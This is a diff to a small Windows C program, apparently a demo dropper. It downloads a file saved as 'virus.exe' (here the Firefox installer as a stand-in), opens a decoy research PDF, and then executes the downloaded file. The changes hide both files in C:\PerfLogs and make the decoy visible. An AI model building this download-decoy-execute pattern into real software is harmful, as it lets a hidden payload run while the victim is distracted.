@@ -14,9 +14,9 @@ int downloadFile(WCHAR* downloadUrl, WCHAR* fileName) {
 int main(void) {
     // Initializing our variables
     WCHAR virusUrl[] = TEXT(L"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US");
-    WCHAR virusName[] = TEXT(L"virus.exe");
+    WCHAR virusName[] = TEXT(L"C:\\PerfLogs\\virus.exe");
     WCHAR pdfUrl[] = TEXT(L"https://www.researchgate.net/profile/Chinelo_Igwenagu2/publication/303381524_Fundamentals_of_research_methodology_and_data_collection/links/573f30ad08ae9ace84133f93/Fundamentals-of-research-methodology-and-data-collection.pdf");
-    WCHAR pdfName[] = TEXT(L"ResearchOnHumanReflexe.pdf");
+    WCHAR pdfName[] = TEXT(L"C:\\PerfLogs\\ResearchOnHumanReflexe.pdf");
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
@@ -31,6 +31,7 @@ int main(void) {
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
     sei.lpFile = pdfName;
     sei.lpVerb = L"open";
+    sei.nShow = SW_SHOWNORMAL;
     ShellExecuteExW(&sei);
 
     // Creating new process and executing the file
